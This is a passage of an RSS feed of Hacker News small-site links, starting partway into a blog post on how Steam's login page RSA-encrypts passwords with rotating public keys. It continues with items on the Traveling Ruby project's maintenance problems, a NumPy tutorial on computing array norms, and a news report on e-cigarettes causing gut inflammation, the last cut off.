password and you will (hopefully) be asked to enter a one-time token generated by your preferred two-factor authentication method. You can stop right there, because the magic I want to point out has already happened. You’ll find that pressing the login button launches a request against an odd endpoint: <code>/login/getrsakey</code>, followed by <code>/login/dologin</code>.</p><figure><img src="https://owlspace.xyz/images/steam-rsa/getrsa-call.png" alt="Requests to fetch script assets, acquire RSA key and perform login"><figcaption><p>All relevant assets and requests in succession</p></figcaption></figure><p>Inspect the request for <code>/login/getrsakey</code> and you’ll find a JSON-formatted response, containing fields with names that should look very familiar to anyone who’s briefly dealt with public key cryptography. You’re given a RSA public key, though the exact values might look a bit odd. It’s clear that <code>publickey_mod</code> and <code>publickey_exp</code> define the modulus and the exponent used in encryption, but the former is given in hexadecimal while the latter appears to be given in binary (I’ll get back on that later). There’s also a timestamp which has no immediately recognizable starting point. As to what the purpose of <code>token_gid</code> is, I have no clue yet.</p><div><pre><code data-lang="json"><span>{</span>
    <span>"success"</span><span>:</span><span>true</span><span>,</span>
    <span>"publickey_mod"</span><span>:</span><span>"c85ba44d5a3608561cb289795ac93b34d4b9b4326f9c09d1d19a9923e2d136b8..."</span><span>,</span>
    <span>"publickey_exp"</span><span>:</span><span>"010001"</span><span>,</span>
    <span>"timestamp"</span><span>:</span><span>"1260462250000"</span><span>,</span>
    <span>"token_gid"</span><span>:</span><span>"2701e0b0a4be3635"</span>
<span>}</span>
</code></pre></div><p>The login page pulls some scripts on load. There is the main login handler contained in <code>login.js</code> which is completely unobfuscated, so anyone can just analyze it and find out what it does. The site also loads some additional dependencies, namely <code>jsbn.js</code> and <code>rsa.js</code>.</p><p>A quick search for the name mentioned in the first line of <code>jsbn.js</code> reveals that these two scripts are the work of <a href="http://www-cs-students.stanford.edu/~tjw/">Tom Wu</a> — a MIT and Stanford graduate who likes software engineering and computer cryptography. They released <code>jsbn.js</code> and <code>rsa.js</code> as pure JavaScript implementations of arbitrary precision integers and RSA encryption/decryption respectively. You’ll also find that these libraries have had their most recent updates in 2005 and 2013 which is a bit of information I’ll come back to later. For now, just keep it in mind.</p><h3 id="going-down-the-rsabbit-hole">Going down the r(s)abbit hole</h3><p>So now that we have all relevant assets, let’s dig around in <code>login.js</code>. The code is a bit of a mess with lots of callbacks and proxied function calls, but it turns out the parts of interest can be easily condensed. In essence, the script can be boiled down to a couple of steps, each step assuming that everything went fine in the previous step.</p><ol><li>The user enters their username and password and presses the login button.</li><li><code>DoLogin</code> is called, which checks if the login mask was filled out correctly and launches a request against <code>/login/getrsakey</code>.</li><li><code>OnRSAKeyResponse</code> is called. This checks if the response is well-formed.</li><li><code>GetAuthCode</code> is called. It runs some platform-specific code in case there are any 2FA measures active on the user’s account.</li><li><code>OnAuthCodeResponse</code> is called. This is where the password is encrypted using RSA and the request against <code>/login/dologin</code> is prepared and executed.</li><li><code>OnLoginResponse</code> is called. The user is logged in and redirected to the Steam storefront.</li></ol><p>The code in <code>OnAuthCodeResponse</code> shows why the requested public key is formatted the way that it is. Starting at line 387 in the source file, the modulus and exponent of the <code>/login/getrsakey</code> response are passed as-is to the RSA library. The user’s password is then encrypted with the given public key and added to the request against <code>/login/dologin</code> in the subsequent login step.</p><div><pre><code data-lang="js"><span>var</span> <span>pubKey</span> <span>=</span> <span>RSA</span><span>.</span><span>getPublicKey</span><span>(</span><span>results</span><span>.</span><span>publickey_mod</span><span>,</span> <span>results</span><span>.</span><span>publickey_exp</span><span>);</span>
<span>var</span> <span>username</span> <span>=</span> <span>this</span><span>.</span><span>m_strUsernameCanonical</span><span>;</span>
<span>var</span> <span>password</span> <span>=</span> <span>form</span><span>.</span><span>elements</span><span>[</span><span>'password'</span><span>].</span><span>value</span><span>;</span>
<span>password</span> <span>=</span> <span>password</span><span>.</span><span>replace</span><span>(</span><span>/[^\x00-\x7F]/g</span><span>,</span> <span>''</span><span>);</span> <span>// remove non-standard-ASCII characters
</span><span></span><span>var</span> <span>encryptedPassword</span> <span>=</span> <span>RSA</span><span>.</span><span>encrypt</span><span>(</span><span>password</span><span>,</span> <span>pubKey</span><span>);</span>
</code></pre></div><p>I copied the source files onto my local machine to explore the RSA library a little bit. Both the modulus and the exponent are passed to the function <code>RSAPublicKey</code> which behaves like a constructor in the “pre-class” JavaScript era. <code>RSAPublicKey</code> simply wraps both values into instances of <code>BigInteger</code> provided by the <code>jsbn.js</code> script. It was to my surprise that the exponent is actually not represented in binary but, just like the modulus, in hexadecimal. (Also, turns out <code>0x010001</code> is a <a href="https://stackoverflow.com/questions/6098381/what-are-common-rsa-sign-exponent">very common encryption exponent</a> in RSA implementations.) So now it’s clear that the password encryption is based on 2048-bit RSA with an encryption exponent of 65537.</p><div><pre><code data-lang="js"><span>let</span> <span>r</span> <span>=</span> <span>RSA</span><span>.</span><span>getPublicKey</span><span>(</span><span>"c85ba44d5a360856..."</span> <span>/* insert your own long modulus here */</span><span>,</span> <span>"010001"</span><span>);</span>
<span>console</span><span>.</span><span>log</span><span>(</span><span>r</span><span>.</span><span>encryptionExponent</span><span>.</span><span>toString</span><span>());</span> <span>// =&gt; "65537"
</span><span></span><span>console</span><span>.</span><span>log</span><span>(</span><span>r</span><span>.</span><span>modulus</span><span>.</span><span>bitLength</span><span>());</span> <span>// =&gt; 2048
</span></code></pre></div><p>Moving on to the <code>timestamp</code> field. The <code>/login/getrsakey</code> response contains an <code>Expires</code> header. It references a date in the past, meaning that the response is absolutely not meant to be cached or persisted in any way. If you check back on <code>/login/getrsakey</code> over a longer period of time, you’ll notice that the public key changes ever so often and, as such, its timestamp value too. This means there’s only a limited time frame in which a certain Steam-issued RSA public key can be used to authenticate.</p><p>This becomes even more evident when examining the subsequent request against <code>/login/dologin</code>. Among many other things, it contains the username, encrypted password as well as the timestamp of the issued RSA public key. Trying to perform a login attempt while altering the timestamp fails as expected. But more importantly, it’s also not possible to reuse an older public key, even if the password is correctly encrypted.</p><p>I went one step further and <a href="https://gist.github.com/JoogsWasTaken/8a8e60859e1721255c57e9185eb6cb10">wrote a simple Python script to collect public keys</a> over the span of three days using a throwaway account. I let it run every five minutes using a cronjob. The goal was to check just how often Steam’s public keys change and to hopefully find out how the <code>timestamp</code> field behaves.</p><figure><img src="https://owlspace.xyz/images/steam-rsa/sqlite-pubkeys.png" alt="SQLite database containing public keys sourced from Steam"><figcaption><p>Lots and lots and lots of public keys</p></figcaption></figure><p>I found that the public key changes every 12 entries, meaning that it’s safe to assume that they rotate every hour. The encryption exponent stays the same — no surprises here. More intriguing however is the aforementioned <code>timestamp</code> field. For every 12 public keys, the value of the <code>timestamp</code> increases by a certain amount, namely 3600000000 and then some. And what’s more is that this number wraps around after some period of time as can be seen in the following image. Be warned, because all of what I’m about to say is highly speculative.</p><figure><img src="https://owlspace.xyz/images/steam-rsa/sqlite-wraparound.png" alt="Public key entries where the timestamp value wraps around in-between"><figcaption><p>Timestamp field wrapping around</p></figcaption></figure><p>I found that 3600000000 microseconds is equal to one hour, making me assume that the value of the <code>timestamp</code> field is, in fact, given in microseconds. However, I already hinted at the fact that the timestamp value doesn’t increase by one hour exactly with every new public key. In my own data, I observed that the difference between two successive timestamps is one hour plus 1 to 2.6 seconds, with most being in the order of about 1.05 to 1.25 seconds. But this raises another interesting possibility.</p><p>Let’s assume that a new public key is generated every hour plus one second. If I query the public key …</p></article></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://owlspace.xyz/cybersec/steam-login/">https://owlspace.xyz/cybersec/steam-login/</a></em></p>]]>
            </description>
            <link>https://owlspace.xyz/cybersec/steam-login/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25690995</guid>
            <pubDate>Fri, 08 Jan 2021 21:51:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Future of Traveling Ruby]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25690967">thread link</a>) | @kureikain
<br/>
January 8, 2021 | https://www.joyfulbikeshedding.com/blog/2021-01-06-the-future-of-traveling-ruby.html | <a href="https://web.archive.org/web/*/https://www.joyfulbikeshedding.com/blog/2021-01-06-the-future-of-traveling-ruby.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

<div>

<p>A couple of years ago, I had a dream: to make it dead-easy to distribute Ruby CLI apps to end users, without requiring those users to install Ruby or muck about with gems and Bundler. And thus <a href="https://phusion.github.io/traveling-ruby">Traveling Ruby</a> was born.</p>
<p>Traveling Ruby hasn't seen updates for quite a while now. Recently I tried making a new bugfix release, but I found it to be more challenging than I had hoped. In this article I reflect on those challenges, as well as on the future of Traveling Ruby.</p>

<h2 id="the-dream-of-a-single-self-contained-package">The dream of a single, self-contained package</h2>
<p>Back in the 90s, I wrote Windows desktop apps with Delphi. Unlike its contemporary competitors such as Visual Basic and Java, which generated apps that required users to install a runtime, Delphi produced a single .exe that just works. Fast forward to the mid 2010s, and we saw that Go – which could also produce a single executable that required no runtime – was gaining popularity. Sometimes at the expense of Ruby.</p>
<p>While Traveling Ruby doesn't produce a single executable, it allows you to package your Ruby app as a single self-contained directory, which is good enough.</p>
<h2 id="whats-needed-sustainability-and-democratization">What's needed: sustainability and democratization</h2>
<p>Traveling Ruby hasn't seen updates for quite a while now, but it's still being used. Yesterday, the author of the <a href="https://docs.pact.io/">Pact contract testing framework</a> asked me to do a new release, because he <a href="https://github.com/phusion/traveling-ruby/pull/94#issuecomment-754371791">needed a bug fix for supporting paths that contain spaces</a>. So I gave it a try. Predictably, the build system is broken due to all the changes in Linux and macOS the past few years, and fixing it all takes a lot of effort.</p>
<p>However, this is not a sustainable. The reason why Traveling Ruby stopped getting updates after a while is because it's too dependent on a single maintainer: myself. The main contributing factor to why there's only a single maintainer, is that maintaining Traveling Ruby requires <a href="https://github.com/phusion/traveling-ruby/issues/88#issuecomment-336400119">expert knowledge on C-based build systems and binary compatibility</a> for both Linux and macOS. This is a low-level skill that's not commonly found in the Ruby community.</p>
<p>The same issue potentially threatens <a href="https://fullstaqruby.org/">Fullstaq Ruby</a>, which is my current main focus. Fullstaq Ruby also requires skills in the areas of C-based build systems, and OS packaging. This time I've learned my lesson, so I <a href="https://www.joyfulbikeshedding.com/blog/2020-05-15-why-fullstaq-ruby.html">seek to make Fullstaq Ruby sustainable</a> through these strategies:</p>
<ul>
<li><strong>Automation</strong> of as many maintenance tasks as possible.</li>
<li><strong>Knowledge sharing</strong> through documentation. Allow anyone to learn the required skills, and clearly describe all the maintenance procedures.</li>
<li><strong>Actively recruiting</strong> more maintainers.</li>
</ul>
<p>These strategies are not easily implemented, and take time.</p>
<p>I hope to revive Traveling Ruby's vision one day. A successor project should employ the same strategies to ensure the sustainability of the project. A successor project should aim for <strong>democratization</strong>: making it easy for <em>anyone</em> to contribute.</p>
<h2 id="challenges">Challenges</h2>
<p>In Traveling Ruby's case, macOS seems to be doing everything it can to prevent democratization from being realized.</p>
<p>Building Traveling Ruby requires setting up an isolated, carefully-controlled build environment. In Linux this is easy: spin up a Docker container. MacOS has no native containers: Docker for Mac is merely a Linux VM; containers don't run macOS inside. So we try to set up such an environment by using environment variables. However, some things cannot be isolated, such as random libraries in /usr/local. So this gives maintainers two options:</p>
<ol>
<li>While maintaining Traveling Ruby, temporarily clear elements that may pollute the build environment. When done with the maintenance work, restore those elements.</li>
<li>Set up an entirely new, clean macOS instance, specifically for the purpose of maintaining Traveling Ruby. Preferably, make this a CI server so that we can automate things.</li>
</ol>
<p>Option 1 is easier than 2, but it's a <em>hassle</em>, and not automated.</p>
<p>Option 2 is very bad too:</p>
<ul>
<li>Setting up a macOS CI server is very expensive, money-wise. This is because its license only allows running on Apple hardware. This means buying or renting dedicated Apple hardware, as opposed to spinning up virtualized cloud instances that run on commodity hardware.</li>
<li>Setting up a macOS CI server is very expensive, time- and effort-wise. Virtualization is a great way to backup, restore and reset the CI server. But macOS is neither a good server OS, nor a good virtualization host. Installing Linux on Apple hardware is not an easy task. Installing macOS in a production-grade virtualizion platform, such as KVM, is also not an easy task.</li>
<li>Thanks to the restrictive licensing, there are very few hosting providers that offer macOS. MacStadium and Amazon Web Services are all that I can think of. All of them are very expensive.</li>
</ul>
<p>What about CI providers, such as Azure DevOps and Github Actions? I hoped that they would bring about more democratization. Unfortunately, there are more roadblocks, making those options entirely unfeasible.</p>
<p>macOS's increasingly restrictive security features, conflict with Traveling Ruby's build environment. In particular, we rely on <code>DYLD_LIBRARY_PATH</code>, but this doesn't work when System Integrity Protection (SIP) is enabled. Disabling SIP on managed CI instances such as Azure DevOps or Github Actions is not possible. I don't know whether disabling SIP on MacStadium and AWS is possible.</p>
<p>This means that we'll need a dedicated Mac machine for maintainers to use. Someone has to buy it, build it and maintain it. This makes that someone a potential bottleneck.</p>
<p>macOS also evolves in much more impactful ways than Linux. This makes knowledge sharing hard, because the knowledge must be ever-evolving. Maintainers must be experts that both understand the underlying issues, as well as keep up with the latest changes, so that they can debug new problems. Finding out that <code>DYLD_LIBRARY_PATH</code> stopped working due to System Integrity Protection, is an example of an obscure problem that's not easily diagnosed by those with insufficient knowledge of macOS's internals.</p>
<h2 id="conclusion">Conclusion</h2>
<p>Making a successor to Traveling Ruby, that's sustainable and democratized, is no easy task, in large thanks to macOS. I have no easy answers to these challenges: it seems that there's no option but to bite the bullet. I hope that its dream will be fulfilled some day, because I love Ruby.</p>
</div>

</article></div>]]>
            </description>
            <link>https://www.joyfulbikeshedding.com/blog/2021-01-06-the-future-of-traveling-ruby.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25690967</guid>
            <pubDate>Fri, 08 Jan 2021 21:48:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Calculating the norm of an array in NumPy]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25690944">thread link</a>) | @jbencook
<br/>
January 8, 2021 | https://jbencook.com/numpy-norm/ | <a href="https://web.archive.org/web/*/https://jbencook.com/numpy-norm/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article role="main">
        <p>A norm is a measure of the size of a matrix or vector and you can compute it in NumPy with the <code>np.linalg.norm()</code> function<a href="https://jbencook.com/numpy-norm/#notes">[1]</a>:</p>

<div><div><pre><code><span>import</span> <span>numpy</span> <span>as</span> <span>np</span>

<span>x</span> <span>=</span> <span>np</span><span>.</span><span>eye</span><span>(</span><span>4</span><span>)</span>
<span>np</span><span>.</span><span>linalg</span><span>.</span><span>norm</span><span>(</span><span>x</span><span>)</span>

<span># Expected result
# 2.0
</span></code></pre></div></div>

<p>When <code>np.linalg.norm()</code> is called on an array-like input without any additional arguments, the default behavior is to compute the L2 norm on a flattened view of the array. This is the <a href="https://jbencook.com/numpy-square-root">square root</a> of the sum of <a href="https://jbencook.com/numpy-square">squared</a> elements and can be interpreted as the length of the vector in Euclidean space.</p>

<!--more-->

<p>Since the <code>ravel()</code> method flattens an array without making any copies and <code>ord</code> specifies the type of norm that will be computed, the above usage is equivalent to:</p>

<div><div><pre><code><span>np</span><span>.</span><span>linalg</span><span>.</span><span>norm</span><span>(</span><span>x</span><span>.</span><span>ravel</span><span>(),</span> <span>ord</span><span>=</span><span>2</span><span>)</span>

<span># Expected result
# 2.0
</span></code></pre></div></div>

<p><em>But watch out!</em> The function can calculate many different kinds of norms. And if you specify the <code>ord</code> argument, then matrices (arrays with <code>ndim=2</code>) are treated differently than vectors (arrays with <code>ndim=1</code>). This leads to a somewhat surprising result:</p>

<div><div><pre><code><span>np</span><span>.</span><span>linalg</span><span>.</span><span>norm</span><span>(</span><span>x</span><span>,</span> <span>ord</span><span>=</span><span>2</span><span>)</span>

<span># Expected result
# 1.0
</span></code></pre></div></div>

<p>That is, even though <code>ord=2</code> is the default behavior for vectors (and for vectors <code>ord=2</code> <em>does</em> mean L2 norm),  <code>np.linalg.norm(x, ord=2)</code> does <em>not</em> compute the L2 norm if x has more than 1 dimension. In fact, somewhat stupidly, <code>ord=2</code> actually means something different for matrices in <code>np.linalg.norm()</code>.</p>

<p>In order to avoid getting tricked by this behavior, it’s worth taking a look at the API and some example use cases.</p>

<h3 id="api">API</h3>

<p>The <code>np.linalg.norm()</code> function has three important arguments: <code>x</code>, <code>ord</code>, and <code>axis</code> <a href="#notes">[2]</a>.</p>

<ul>
  <li><code>x</code>: this is an array-like input. If <code>ord</code> and <code>axis</code> are both <code>None</code>, then <code>np.linalg.norm()</code> will return the L2 norm of <code>x.ravel()</code>, which is a flattened (i.e. 1-dimensional) view of the array.</li>
  <li><code>ord</code>: the type of norm. If you just pass in <code>x</code> and <code>ord</code> leaving <code>axis</code> as <code>None</code>, then <code>x</code> must be 1-dimensional or 2-dimensional, otherwise you will get an exception. Most commonly, when <code>x</code> is a vector, you will want <code>ord=2</code> or <code>ord=1</code> for L2 and L1 norms respectively. And when <code>x</code> is a matrix, you will want <code>ord='fro'</code> for the Frobenius norm. But NumPy does support other norms which you can look up in <a href="https://numpy.org/doc/stable/reference/generated/numpy.linalg.norm.html">their docs</a>.</li>
  <li><code>axis</code>: the axis (or axes) to reduce with the norm operation. If this is an <code>int</code> then you will get vector norms along that dimension and if this is a 2-tuple, then you will get matrix norms along those dimensions.</li>
</ul>

<p>That’s all a little too confusing for my preference. So instead of worrying about the combination of the number of dimensions of your <code>x</code> argument and <code>ord</code>, my recommendation is to use <code>x</code> by itself when you want an L2 norm or Frobenius norm (which is the same as the L2 norm on the flattened matrix):</p>



<p>Sometimes the <code>ord</code> and <code>axis</code> arguments are unavoidable (and I’ll show an example below), but only if 1) you need to reduce one or two of the dimensions or 2) you want to compute a norm other than L2.</p>

<h3 id="examples">Examples</h3>

<h4 id="relative-error">Relative error</h4>

<p>Let’s start with an easy example. A great use case for norms is computing the relative error between two arrays. For scalars, relative error is usually calculated with <code>|x - x'| / |x|</code>. Think of this like the size of the difference divided by the size of the original number.</p>

<p>Since norms are a way to encode the size of an array with a single number, you can use norms to do something very similar for arrays:</p>

<div><div><pre><code><span>x_prime</span> <span>=</span> <span>x</span> <span>+</span> <span>np</span><span>.</span><span>random</span><span>.</span><span>uniform</span><span>(</span><span>0</span><span>,</span> <span>0.1</span><span>)</span>
<span>np</span><span>.</span><span>linalg</span><span>.</span><span>norm</span><span>(</span><span>x_prime</span> <span>-</span> <span>x</span><span>)</span> <span>/</span> <span>np</span><span>.</span><span>linalg</span><span>.</span><span>norm</span><span>(</span><span>x</span><span>)</span>

<span># Expected result like...
# 0.05465174120478311
</span></code></pre></div></div>

<p>Easy!</p>

<h4 id="normalization">Normalization</h4>

<p>You can normalize an array in order to force it to have a norm that you specify. For example, you can generate a random array that has an L2 norm of (approximately) 3. Just multiply every element by 3 and divide by the L2 norm:</p>

<div><div><pre><code><span>x</span> <span>=</span> <span>np</span><span>.</span><span>random</span><span>.</span><span>uniform</span><span>(</span><span>size</span><span>=</span><span>10</span><span>)</span>
<span>x</span> <span>=</span> <span>3</span> <span>*</span> <span>x</span> <span>/</span> <span>np</span><span>.</span><span>linalg</span><span>.</span><span>norm</span><span>(</span><span>x</span><span>)</span>
<span>np</span><span>.</span><span>linalg</span><span>.</span><span>norm</span><span>(</span><span>x</span><span>)</span>

<span># Expected result
</span><span>2.9999999999999996</span>
</code></pre></div></div>

<p>If you wanted the vector have a unit norm, you would simply divide every element by the norm.</p>

<p>Sometimes, you may want to do this for your dataset. Say you have a matrix of data where every row is a sample and every column is a feature. If you want every row to have a unit norm, you can:</p>

<ol>
  <li>Compute the row-wise norms (reducing the column dimension)</li>
  <li>Divide every element by its row norm</li>
</ol>

<p>Here’s the code to normalize rows by their L2 norms for a randomly generated dataset with 10 rows and 3 columns:</p>

<div><div><pre><code><span>data</span> <span>=</span> <span>np</span><span>.</span><span>random</span><span>.</span><span>uniform</span><span>(</span><span>size</span><span>=</span><span>(</span><span>10</span><span>,</span> <span>3</span><span>))</span>
<span>row_l2_norms</span> <span>=</span> <span>np</span><span>.</span><span>linalg</span><span>.</span><span>norm</span><span>(</span><span>data</span><span>,</span> <span>axis</span><span>=</span><span>1</span><span>)</span>
<span>data</span> <span>/=</span> <span>row_l2_norms</span><span>[:,</span> <span>None</span><span>]</span>

<span># Now the rows all have a L2 norm of 1
</span><span>np</span><span>.</span><span>linalg</span><span>.</span><span>norm</span><span>(</span><span>data</span><span>,</span> <span>axis</span><span>=</span><span>1</span><span>)</span>

<span># Expected result
</span><span>array</span><span>([</span><span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>])</span>
</code></pre></div></div>

<p>Notice: <code>row_l2_norms</code> will be a vector with size 10. If we want to use broadcasting rules to divide every element in <code>data</code>, which has shape <code>(10, 3)</code>, we need to add a dummy dimension to give <code>row_l2_norms</code> shape <code>(10, 1)</code>. That’s what the <a href="https://jbencook.com/adding-a-dimension-to-a-tensor-in-pytorch"><code>None</code> index is doing</a>.</p>

<p>Additionally, since the input is a matrix and we’re passing in <code>axis=1</code>, the function will compute the vector norm of each row. This means it’s safe to pass in <code>ord=1</code> to get the row-wise L1 norms:</p>

<div><div><pre><code><span>data</span> <span>=</span> <span>np</span><span>.</span><span>random</span><span>.</span><span>uniform</span><span>(</span><span>size</span><span>=</span><span>(</span><span>10</span><span>,</span> <span>3</span><span>))</span>
<span>row_l1_norms</span> <span>=</span> <span>np</span><span>.</span><span>linalg</span><span>.</span><span>norm</span><span>(</span><span>data</span><span>,</span> <span>ord</span><span>=</span><span>1</span><span>,</span> <span>axis</span><span>=</span><span>1</span><span>)</span>
<span>data</span> <span>/=</span> <span>row_l1_norms</span><span>[:,</span> <span>None</span><span>]</span>

<span># Now the rows all have a L1 norm of 1
</span><span>np</span><span>.</span><span>linalg</span><span>.</span><span>norm</span><span>(</span><span>data</span><span>,</span> <span>ord</span><span>=</span><span>1</span><span>,</span> <span>axis</span><span>=</span><span>1</span><span>)</span>

<span># Expected result
</span><span>array</span><span>([</span><span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>])</span>
</code></pre></div></div>

<p>This would <em>not</em> work if <code>data</code> had more than 2 dimensions.</p>

<p>By the way, scikit-learn provides a convenience function so you can more easily normalize rows of a dataset to have L1 or L2 unit norms. Here’s an example of normalizing every row by its L1 norm:</p>

<div><div><pre><code><span>from</span> <span>sklearn</span> <span>import</span> <span>preprocessing</span>

<span>data</span> <span>=</span> <span>np</span><span>.</span><span>random</span><span>.</span><span>uniform</span><span>(</span><span>size</span><span>=</span><span>(</span><span>10</span><span>,</span> <span>3</span><span>))</span>
<span>data</span> <span>=</span> <span>preprocessing</span><span>.</span><span>normalize</span><span>(</span><span>data</span><span>,</span> <span>norm</span><span>=</span><span>'l1'</span><span>)</span>

<span># Now the rows all have a L1 norm of 1
</span><span>np</span><span>.</span><span>linalg</span><span>.</span><span>norm</span><span>(</span><span>data</span><span>,</span> <span>ord</span><span>=</span><span>1</span><span>,</span> <span>axis</span><span>=</span><span>1</span><span>)</span>

<span># Expected result
</span><span>array</span><span>([</span><span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>])</span>
</code></pre></div></div>

<h4 id="pairwise-distance">Pairwise distance</h4>

<p>You can also use <code>np.linalg.norm()</code> to compute pairwise Euclidean distance between two sets of points. This is a little more involved and I have a separate post on that <a href="https://jbencook.com/pairwise-distance-in-numpy">here</a>.</p>

<h3 id="notes">Notes</h3>
<p>[1]: The same function is available as <code>scipy.linalg.norm()</code>. But you should never need to use it since 1) the API is the same and 2) if you have SciPy installed in your environment, then you also have NumPy.</p>

<p>[2]: <code>np.linalg.norm()</code> does accept other arguments, but you probably don’t need to use them.</p>

      </article></div>]]>
            </description>
            <link>https://jbencook.com/numpy-norm/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25690944</guid>
            <pubDate>Fri, 08 Jan 2021 21:46:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Study: E-cigarettes trigger inflammation in the gut]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25690888">thread link</a>) | @finphil
<br/>
January 8, 2021 | https://nuadox.com/post/639780077299695616/e-cigarettes-gut-inflammation | <a href="https://web.archive.org/web/*/https://nuadox.com/post/639780077299695616/e-cigarettes-gut-inflammation">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> 
                 
                    
                    <article id="639780077299695616">
                        <div>
                            <div>
                                <a href="https://nuadox.com/post/639780077299695616/e-cigarettes-gut-inflammation"><h2>Study: E-cigarettes trigger inflammation in the gut</h2></a>
                                <figure data-orig-width="1920" data-orig-height="1280"><img src="https://64.media.tumblr.com/719adc344f9d012b68317d81612ff379/1c0ff7a9c3fdd454-cc/s1280x1920/e5552cbe243605bda059375f95029aa3b5896fe1.jpg" alt="image" data-orig-width="1920" data-orig-height="1280" width="1280" height="853"></figure><p><b>- By&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fhealth.ucsd.edu%2Fnews%2Fpages%2Fcontacts.aspx&amp;t=NWJiZjQwYTZkNTZjMWUxNTI5MTJmMjdiZDU0ZTdiZjgwMDlhODdhMiwyeTAyd2poeQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F639780077299695616%2Fe-cigarettes-gut-inflammation&amp;m=0&amp;ts=1610341358">Jeanna Vazquez</a> , <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fucsd.edu%2F&amp;t=NWVkYzRmZTdjMzVmMTYxYTg0YTM1NjhjOGZiYTZkZmUxNDVhOWQ4YSwyeTAyd2poeQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F639780077299695616%2Fe-cigarettes-gut-inflammation&amp;m=0&amp;ts=1610341358">UC San Diego</a> -</b></p><p>Touted by makers as a “healthy” alternative to traditional nicotine cigarettes, new research indicates the chemicals found in e-cigarettes disrupt the gut barrier and trigger inflammation in the body, potentially leading to a variety of health concerns. </p><p>In the study, published Jan. 5, 2021 in the journal <i><a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.cell.com%2Fiscience%2Ffulltext%2FS2589-0042%2821%2900003-1&amp;t=YTllNWQwNTkzM2Q2ZTA1OGNjNjllN2M3MTMxMWU0ZjI1ZTdhZjU0MCwyeTAyd2poeQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F639780077299695616%2Fe-cigarettes-gut-inflammation&amp;m=0&amp;ts=1610341358">iScience</a></i>, Soumita Das, PhD, associate professor of pathology, and Pradipta Ghosh, MD, professor of cellular and molecular medicine at UC San Diego School of Medicine and Moores Cancer Center at UC San Diego School of Medicine, with colleagues, found that chronic use of nicotine-free e-cigarettes led to a “leaky gut,” in which microbes and other molecules seep out of the intestines, resulting in chronic inflammation. Such inflammation can contribute to a variety of diseases and conditions, including inflammatory bowel disease, dementia, certain cancers, atherosclerosis, liver fibrosis, diabetes and arthritis. </p><p>“The gut lining is an amazing entity. It is comprised of a single layer of cells that are meant to seal the body from the trillions of microbes, defend our immune system, and at the same time allow absorption of essential nutrients,” said Ghosh. “Anything we eat or drink, our lifestyle choices in other words, has the ability to impact our gut microbes, the gut barrier and overall health. Now we know that what we smoke, such as e-cigarettes, negatively impacts it as well.”</p><p>The researchers found that two chemicals used as a base for all e-cigarette liquid vapor — propylene glycol and vegetable glycerol — were the cause of inflammation.</p><p>“Numerous chemicals are created when these two are heated to generate the fumes in vaping that cause the most damage, for which there are no current regulations,” said Ghosh. “The safety of e-cigarettes have been debated fiercely on both sides. Nicotine content, and its addictive nature, has always been the major focus of those who argue against its safety, whereas lack of chemicals in the carcinogens that are present in the cigarette smoke has been touted by the makers of e-cigarettes when marketing these products as a ‘healthy alternative.’ In reality, it’s the chemicals making up the vapor liquid that we should be more concerned about as they are the cause of gut inflammation.” &nbsp;</p><p>For the study, the team used 3D models of human intestinal tracts generated from patient cells and simulated what happens when e-cigarette vapors enter the gut lining. Researchers validated the findings using mice models of vaping in collaboration with Laura Crotty-Alexander, MD, associate professor of medicine in the Division of Pulmonary, Critical Care and Sleep Medicine at UC San Diego School of Medicine and section chief of Pulmonary Critical Care at Veterans Affairs San Diego Healthcare System.</p><p>To produce the 3D gut organoids, the researchers collected stem cells from patients’ biopsies during colonoscopies and grew them in vitro. The stem cells differentiated into the four different cell types that make up the gut lining. The team then exposed the organoids to e-cigarette liquid vapor, mimicking the frequency of a chronic vaper.</p><figure data-orig-width="640" data-orig-height="400"><img src="https://64.media.tumblr.com/4cd0a7df45ff92ad73c77d47869af825/1c0ff7a9c3fdd454-ab/s640x960/5d6405078c464994050bbc8bc369bc2296633165.jpg" alt="image" data-orig-width="640" data-orig-height="400" width="640" height="400"></figure><p><i>Image: In the bottom frames, burst cell junctions in the gut lining can be seen after being exposed to e-cigarette chemicals as compared to healthy cells in the top frames. Credit: <a 